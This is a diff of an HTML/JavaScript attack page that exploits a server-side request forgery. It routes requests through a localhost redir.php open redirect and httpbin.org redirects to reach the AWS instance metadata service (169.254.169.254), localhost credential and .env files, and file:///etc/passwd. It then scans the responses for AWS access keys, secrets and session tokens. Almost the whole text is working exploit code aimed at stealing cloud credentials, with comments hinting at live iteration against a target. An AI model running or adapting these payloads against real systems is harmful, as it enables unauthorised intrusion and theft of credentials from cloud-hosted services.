@@ -1,74 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AWS Metadata v1 Attack</title>
+    <title>AWS Token Extraction</title>
 </head>
 <body>
-    <h1>🎯 AWS Metadata Service v1 + Localhost Exploration</h1>
+    <h1>🔐 AWS Metadata Token Extraction</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Since we confirmed httpbin.org redirect works, try AWS metadata v1 endpoints
-        var awsV1Tests = [
-            // AWS Metadata Service v1.0 (no token required!)
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/iam/',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
+        // Try to extract AWS metadata token using httpbin.org PUT capabilities
+        var tokenTests = [
+            // Try httpbin.org PUT to get AWS token
+            'http://httpbin.org/put',
+            'http://httpbin.org/anything',
+            'http://httpbin.org/post',
             
-            // Try older AWS API versions
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2007-01-19/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2008-02-01/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2009-04-04/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/2011-01-01/meta-data/',
+            // Try specific AWS token endpoints
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/api/token',
+            'http://httpbin.org/redirect-to?url=http://169.254.169.254/latest/api/',
             
-            // Try without /latest/ prefix
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://169.254.169.254/user-data/',
+            // Try localhost endpoints that might have tokens/credentials stored
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/token',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/api/token',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.aws/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/aws/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/credentials.json',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/config.json',
             
-            // Explore localhost since it returned 3201 bytes!
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=https://www.google.com',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.env',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/.aws/credentials',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/config.php',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/phpinfo.php',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/debug.php',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/credentials',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/aws-credentials',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/secret/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/admin/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/backup/',
+            // Try common AWS credential file locations on localhost
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/var/www/html/.env',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/home/ubuntu/.aws/credentials',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/root/.aws/credentials',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/etc/environment',
             
-            // Try to access AWS metadata via 127.0.0.1 (might have different routing)
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1:169/meta-data/',
-            'http://httpbin.org/redirect-to?url=http://127.0.0.1/meta-data/',
+            // Try to find if there are other services on localhost
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1:8080/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1:3000/',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1:9000/',
+            
+            // Try to access different paths on the main localhost service
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/index.php',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php',
+            'http://httpbin.org/redirect-to?url=http://127.0.0.1/releasenotes.txt',
+            
+            // Try file:// protocol via httpbin.org redirect
+            'http://httpbin.org/redirect-to?url=file:///etc/passwd',
+            'http://httpbin.org/redirect-to?url=file:///proc/version',
+            'http://httpbin.org/redirect-to?url=file:///var/www/html/.env',
+            'http://httpbin.org/redirect-to?url=file:///home/ubuntu/.aws/credentials',
         ];
         
-        for(var i = 0; i < awsV1Tests.length; i++) {
+        for(var i = 0; i < tokenTests.length; i++) {
             try {
-                results += "<h3>🎯 " + (i+1) + ": " + awsV1Tests[i].split('url=')[1] + "</h3>";
+                results += "<h3>🔍 " + (i+1) + ": " + tokenTests[i] + "</h3>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(awsV1Tests[i]), false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(tokenTests[i]), false);
                 xhr.send();
                 
                 if(xhr.responseText && xhr.responseText.trim().length > 5) {
-                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>🎯 SUCCESS: " + xhr.responseText.length + " bytes</div>";
+                    results += "<div style='background:#e8f5e8;padding:10px;border:2px solid green;'>✅ RESPONSE: " + xhr.responseText.length + " bytes</div>";
                     
-                    // Look for AWS credentials
+                    // Look for any AWS-related content
                     var text = xhr.responseText.toLowerCase();
-                    if(text.includes('accesskeyid') || text.includes('secretaccesskey') || text.includes('sessiontoken')) {
-                        results += "<div style='background:#ff0000;color:white;padding:10px;border:3px solid red;'>🚨 AWS CREDENTIALS FOUND! 🚨</div>";
+                    if(text.includes('aws_access_key') || text.includes('aws_secret') || text.includes('accesskeyid')) {
+                        results += "<div style='background:#ff0000;color:white;padding:10px;border:3px solid red;'>🚨 AWS CREDENTIALS DETECTED! 🚨</div>";
                     }
-                    if(text.includes('s3role') || text.includes('ec2role') || text.includes('iam')) {
-                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🔑 IAM ROLE DETECTED!</div>";
+                    if(text.includes('token') || text.includes('session')) {
+                        results += "<div style='background:#ffa500;color:white;padding:8px;'>🔐 TOKEN/SESSION FOUND!</div>";
                     }
-                    if(text.includes('ami-') || text.includes('instance-') || text.includes('vol-')) {
-                        results += "<div style='background:#74c0fc;padding:8px;'>☁️ AWS METADATA FOUND!</div>";
+                    if(text.includes('asia') || text.includes('akia') || text.includes('secret')) {
+                        results += "<div style='background:#74c0fc;padding:8px;'>🔑 CREDENTIAL PATTERN DETECTED!</div>";
                     }
-                    if(text.includes('401') || text.includes('unauthorized')) {
-                        results += "<div style='background:#ffeaa7;padding:8px;'>⚠️ 401 Unauthorized (need token)</div>";
+                    if(text.includes('root:') || text.includes('ubuntu:') || text.includes('/bin/bash')) {
+                        results += "<div style='background:#9c88ff;padding:8px;'>📁 SYSTEM FILE ACCESS!</div>";
                     }
                     
                     results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;white-space:pre-wrap;word-wrap:break-word;'>" + xhr.responseText + "</div>";
